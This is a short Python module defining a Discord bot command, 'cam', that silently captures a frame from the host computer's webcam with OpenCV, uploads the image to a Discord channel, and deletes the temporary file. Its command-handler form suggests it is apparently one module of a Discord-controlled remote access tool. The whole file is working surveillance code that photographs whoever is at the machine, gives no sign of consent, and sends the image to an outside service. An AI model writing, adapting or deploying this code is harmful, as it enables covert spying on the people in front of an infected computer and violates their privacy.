
import os
import tempfile
import cv2
import discord


async def cam(client:discord.Client, message:discord.Message, args:str, send):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp:
        o = cv2.VideoCapture(0)
        s, img = o.read()
        del s
        cv2.imwrite(temp.name, img)
        await send(file=discord.File(temp.name))
        o.release()
        temp.close()
        os.unlink(temp.name)